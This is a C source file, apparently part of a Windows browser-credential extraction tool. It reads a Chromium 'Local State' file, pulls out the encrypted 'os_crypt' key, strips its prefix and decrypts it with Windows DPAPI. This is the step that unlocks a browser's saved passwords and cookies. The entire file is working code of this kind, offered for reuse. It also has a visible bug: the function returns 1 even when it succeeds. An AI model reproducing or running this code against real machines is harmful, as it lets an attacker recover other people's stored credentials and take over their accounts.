/*
  Copyright (c) 2023 Shoaib Hassan

  Permission is hereby granted, free of charge, to any person obtaining a copy
  of this software and associated documentation files (the "Software"), to deal
  in the Software without restriction, including without limitation the rights
  to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
  copies of the Software, and to permit persons to whom the Software is
  furnished to do so, subject to the following conditions:

  The above copyright notice and this permission notice shall be included in
  all copies or substantial portions of the Software.

  THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
  THE SOFTWARE.
*/


#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <wincrypt.h>

#include "../Include/cJSON.h"
#include "../Include/GetSecretKey.h"

// Function to get the secret key from the Local State file
int GetSecretKey(const char* localStatePath, DATA_BLOB* dataOut) {
    // Open the Local State file
    FILE* file = fopen(localStatePath, "r");
    if (file == NULL) {
        perror("[-]: Error opening file");
        fprintf(stderr, "[-]: File path: %s\n", localStatePath);
        return 1;
    }
	
    // Calculate the file size
    fseek(file, 0, SEEK_END);
    long fileSize = ftell(file);
    fseek(file, 0, SEEK_SET);

    // Allocate memory to store the file content
    char* localState = (char*)malloc(fileSize + 1);
    if (localState == NULL) {
        perror("[-]: Memory allocation error");
        fclose(file);
        return 1;
    }

    // Read the file content into the allocated memory
    fread(localState, 1, fileSize, file);
    fclose(file);
    localState[fileSize] = '\0';

    // Parse the file content as JSON
    cJSON* root = cJSON_Parse(localState);
    if (root == NULL) {
        fprintf(stderr, "[-]: Error parsing JSON: %s\n", cJSON_GetErrorPtr());
        free(localState);
        return 1;
    }

    // Get the 'os_crypt' object from the JSON
    cJSON* osCrypt = cJSON_GetObjectItem(root, "os_crypt");
    if (osCrypt == NULL) {
        fprintf(stderr, "[-]: Failed to find 'os_crypt' object in Local State file\n");
        cJSON_Delete(root);
        free(localState);
        return 1;
    }

    // Get the 'encrypted_key' from the 'os_crypt' object
    cJSON* encryptedKey = cJSON_GetObjectItem(osCrypt, "encrypted_key");
    if (encryptedKey == NULL) {
        fprintf(stderr, "[-]: Failed to find 'encrypted_key' in 'os_crypt' object\n");
        cJSON_Delete(root);
        free(localState);
        return 1;
    }

    // Extract the encrypted key string
    const char* encryptedKeyStr = cJSON_GetStringValue(encryptedKey);

    // Convert the Base64-encoded string to binary
    DWORD decodedSize;
    CryptStringToBinaryA(encryptedKeyStr, 0, CRYPT_STRING_BASE64, NULL, &decodedSize, NULL, NULL);
    BYTE* decodedKey = (BYTE*)malloc(decodedSize);
    CryptStringToBinaryA(encryptedKeyStr, 0, CRYPT_STRING_BASE64, decodedKey, &decodedSize, NULL, NULL);

    // Remove the first 5 bytes from the decoded key
    decodedSize = decodedSize - 5;
    memmove(decodedKey, decodedKey + 5, decodedSize);

    // Set up the input data for decryption
    DATA_BLOB dataIn = { decodedSize, decodedKey };
    memset(dataOut, 0, sizeof(DATA_BLOB));

    // Decrypt the key
    if (!CryptUnprotectData(&dataIn, NULL, NULL, NULL, NULL, 0, dataOut)) {
        fprintf(stderr, "[-]: Failed to decrypt key\n");
        cJSON_Delete(root);
        free(localState);
        free(decodedKey);
        return 1;
    }

    // Clean up and return
    cJSON_Delete(root);
    free(localState);
    free(decodedKey);
    return 1;
}
